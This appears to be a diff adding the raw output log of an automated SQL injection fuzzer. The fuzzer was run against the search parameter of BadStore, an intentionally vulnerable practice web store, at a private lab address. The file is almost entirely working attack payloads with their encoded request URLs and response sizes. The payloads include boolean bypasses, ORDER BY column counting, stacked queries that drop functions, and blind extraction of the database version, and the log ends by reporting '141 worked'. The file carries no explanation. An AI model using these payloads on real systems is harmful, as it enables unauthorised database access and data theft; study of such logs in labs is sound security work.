@@ -1,0 +1,566 @@
+ 'OR 1=1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%201%3D1&action=search&x=0&y=0
+	473
+
+ 'OR 1=0
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%201%3D0&action=search&x=0&y=0
+	473
+
+ 'OR x=x
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%20x%3Dx&action=search&x=0&y=0
+	474
+
+ 'OR x=y
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%20x%3Dy&action=search&x=0&y=0
+	473
+
+ 'OR 1=1#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%201%3D1%23&action=search&x=0&y=0
+	7922
+
+ 'OR x=x#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%20x%3Dx%23&action=search&x=0&y=0
+	337
+
+ 'OR x=y#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%20x%3Dy%23&action=search&x=0&y=0
+	337
+
+ 'OR 1=1--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%201%3D1--&action=search&x=0&y=0
+	473
+
+ 'OR 1=0--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%201%3D0--&action=search&x=0&y=0
+	473
+
+ 'OR x=x--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%20x%3Dx--&action=search&x=0&y=0
+	473
+
+ 'OR x=y--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%20x%3Dy--&action=search&x=0&y=0
+	473
+
+ 'OR 3409=3409 AND ('pytW' LIKE 'pytW
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%203409%3D3409%20AND%20%28%27pytW%27%20LIKE%20%27pytW&action=search&x=0&y=0
+	447
+
+ 'OR 3409=3409 AND ('pytW' LIKE 'pytY
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27OR%203409%3D3409%20AND%20%28%27pytW%27%20LIKE%20%27pytY&action=search&x=0&y=0
+	447
+
+ 'HAVING 1=1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27HAVING%201%3D1&action=search&x=0&y=0
+	473
+
+ 'HAVING 1=0
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27HAVING%201%3D0&action=search&x=0&y=0
+	473
+
+ 'HAVING 1=1--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27HAVING%201%3D1--&action=search&x=0&y=0
+	473
+
+ 'HAVING 1=0--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27HAVING%201%3D0--&action=search&x=0&y=0
+	473
+
+ 'AND 1=1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AND%201%3D1&action=search&x=0&y=0
+	473
+
+ 'AND 1=0
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AND%201%3D0&action=search&x=0&y=0
+	473
+
+ 'AND 1=1--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AND%201%3D1--&action=search&x=0&y=0
+	473
+
+ 'AND 1=0--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AND%201%3D0--&action=search&x=0&y=0
+	473
+
+ 'AND 1083=1083 AND (1427=1427
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AND%201083%3D1083%20AND%20%281427%3D1427&action=search&x=0&y=0
+	473
+
+ 'AND 7506=9091 AND (5913=5913
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AND%207506%3D9091%20AND%20%285913%3D5913&action=search&x=0&y=0
+	473
+
+ 'AND 1083=1083 AND ('1427=1427
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AND%201083%3D1083%20AND%20%28%271427%3D1427&action=search&x=0&y=0
+	447
+
+ 'AND 7506=9091 AND ('5913=5913
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AND%207506%3D9091%20AND%20%28%275913%3D5913&action=search&x=0&y=0
+	447
+
+ 'AND 7300=7300 AND ('pKlZ'='pKlZ
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AND%207300%3D7300%20AND%20%28%27pKlZ%27%3D%27pKlZ&action=search&x=0&y=0
+	447
+
+ 'AND 7300=7300 AND ('pKlZ'='pKlY
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AND%207300%3D7300%20AND%20%28%27pKlZ%27%3D%27pKlY&action=search&x=0&y=0
+	447
+
+ 'AS INJECTX WHERE 1=1 AND 1=1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1&action=search&x=0&y=0
+	500
+
+ 'AS INJECTX WHERE 1=1 AND 1=0
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0&action=search&x=0&y=0
+	500
+
+ 'AS INJECTX WHERE 1=1 AND 1=1#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1%23&action=search&x=0&y=0
+	500
+
+ 'AS INJECTX WHERE 1=1 AND 1=0#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0%23&action=search&x=0&y=0
+	500
+
+ 'AS INJECTX WHERE 1=1 AND 1=1--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1--&action=search&x=0&y=0
+	500
+
+ 'AS INJECTX WHERE 1=1 AND 1=0--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0--&action=search&x=0&y=0
+	500
+
+ 'WHERE 1=1 AND 1=1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27WHERE%201%3D1%20AND%201%3D1&action=search&x=0&y=0
+	490
+
+ 'WHERE 1=1 AND 1=0
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27WHERE%201%3D1%20AND%201%3D0&action=search&x=0&y=0
+	490
+
+ 'WHERE 1=1 AND 1=1#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27WHERE%201%3D1%20AND%201%3D1%23&action=search&x=0&y=0
+	491
+
+ 'WHERE 1=1 AND 1=0#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27WHERE%201%3D1%20AND%201%3D0%23&action=search&x=0&y=0
+	491
+
+ 'WHERE 1=1 AND 1=1--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27WHERE%201%3D1%20AND%201%3D1--&action=search&x=0&y=0
+	492
+
+ 'WHERE 1=1 AND 1=0--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27WHERE%201%3D1%20AND%201%3D0--&action=search&x=0&y=0
+	492
+
+ 'ORDER BY 1--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%201--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 2--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%202--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 3--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%203--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 4--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%204--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 5--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%205--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 6--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%206--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 7--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%207--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 8--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%208--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 9--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%209--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 10--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2010--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 11--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2011--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 12--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2012--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 13--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2013--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 14--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2014--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 15--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2015--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 16--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2016--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 17--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2017--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 18--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2018--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 19--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2019--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 20--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2020--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 21--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2021--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 22--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2022--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 23--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2023--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 24--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2024--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 25--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2025--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 26--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2026--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 27--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2027--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 28--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2028--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 29--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2029--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 30--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2030--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 31337--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2031337--&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 5#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%205%23&action=search&x=0&y=0
+	337
+
+ 'ORDER BY 6#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%206%23&action=search&x=0&y=0
+	337
+
+ 'ORDER BY 7#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%207%23&action=search&x=0&y=0
+	337
+
+ 'ORDER BY 8#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%208%23&action=search&x=0&y=0
+	337
+
+ 'ORDER BY 9#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%209%23&action=search&x=0&y=0
+	337
+
+ 'ORDER BY 10#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2010%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 11#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2011%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 12#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2012%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 13#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2013%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 14#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2014%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 15#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2015%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 16#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2016%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 17#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2017%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 18#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2018%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 19#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2019%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 20#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2020%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 21#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2021%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 22#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2022%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 23#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2023%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 24#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2024%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 25#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2025%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 26#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2026%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 27#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2027%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 28#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2028%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 29#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2029%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 30#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2030%23&action=search&x=0&y=0
+	338
+
+ 'ORDER BY 31337#
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2031337%23&action=search&x=0&y=0
+	341
+
+ 'ORDER BY 1
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%201&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 2
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%202&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 3
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%203&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 4
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%204&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 5
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%205&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 6
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%206&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 7
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%207&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 8
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%208&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 9
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%209&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 10
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2010&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 11
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2011&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 12
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2012&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 13
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2013&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 14
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2014&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 15
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2015&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 16
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2016&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 17
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2017&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 18
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2018&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 19
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2019&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 20
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2020&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 21
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2021&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 22
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2022&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 23
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2023&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 24
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2024&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 25
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2025&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 26
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2026&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 27
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2027&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 28
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2028&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 29
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2029&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 30
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2030&action=search&x=0&y=0
+	473
+
+ 'ORDER BY 31337
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27ORDER%20BY%2031337&action=search&x=0&y=0
+	473
+
+ 'RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4347%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29%20AND%20%27Txws%27%3D%27&action=search&x=0&y=0
+	349
+
+'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27IF%287423%3D7424%29%20SELECT%207423%20ELSE%20DROP%20FUNCTION%20xcjl--&action=search&x=0&y=0
+	500
+
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27IF%287423%3D7423%29%20SELECT%207423%20ELSE%20DROP%20FUNCTION%20xcjl--&action=search&x=0&y=0
+	500
+
+'% AND 8310=8310 AND '%'='
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%25%20AND%208310%3D8310%20AND%20%27%25%27%3D%27&action=search&x=0&y=0
+	496
+
+'% AND 8310=8311 AND '%'='
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%25%20AND%208310%3D8311%20AND%20%27%25%27%3D%27&action=search&x=0&y=0
+	496
+
+ 'and (select substring(@@version,1,1))='X'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27and%20%28select%20substring%28%40%40version%2C1%2C1%29%29%3D%27X%27&action=search&x=0&y=0
+	476
+
+ 'and (select substring(@@version,1,1))='M'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27and%20%28select%20substring%28%40%40version%2C1%2C1%29%29%3D%27M%27&action=search&x=0&y=0
+	476
+
+ 'and (select substring(@@version,2,1))='i'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27and%20%28select%20substring%28%40%40version%2C2%2C1%29%29%3D%27i%27&action=search&x=0&y=0
+	476
+
+ 'and (select substring(@@version,2,1))='y'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27and%20%28select%20substring%28%40%40version%2C2%2C1%29%29%3D%27y%27&action=search&x=0&y=0
+	476
+
+ 'and (select substring(@@version,3,1))='c'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27and%20%28select%20substring%28%40%40version%2C3%2C1%29%29%3D%27c%27&action=search&x=0&y=0
+	476
+
+ 'and (select substring(@@version,3,1))='S'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27and%20%28select%20substring%28%40%40version%2C3%2C1%29%29%3D%27S%27&action=search&x=0&y=0
+	476
+
+ 'and (select substring(@@version,3,1))='X'
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%20%27and%20%28select%20substring%28%40%40version%2C3%2C1%29%29%3D%27X%27&action=search&x=0&y=0
+	476
+
+
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=&action=search&x=0&y=0
+	4137
+
+141 worked
+[*] Runtime: 3.20180487633
